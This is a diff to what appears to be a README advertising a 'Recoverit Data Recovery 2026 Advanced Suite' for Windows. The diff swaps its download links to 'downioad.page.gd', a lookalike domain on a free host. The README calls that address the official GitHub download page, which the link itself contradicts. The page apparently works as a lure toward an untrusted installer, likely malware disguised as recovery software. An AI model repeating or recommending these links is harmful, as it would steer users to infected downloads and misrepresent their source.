@@ -2,7 +2,7 @@
 
 Recoverit Data Recovery 2026 Advanced Suite is a comprehensive tool designed to augment the data recovery process for Windows users. This software package provides enhanced features and optimizations to assist in retrieving lost or deleted files with greater efficiency and reliability. Whether you're dealing with accidental deletions, system crashes, or storage issues, this suite aims to simplify the recovery journey on Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ An internet connection is needed for initial activation, updates, and accessing 
 
 To obtain the latest version of Recoverit Data Recovery 2026 Advanced Suite, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to the official download page where you can access the installer securely. Always ensure you are downloading from trusted sources to maintain system integrity.
 
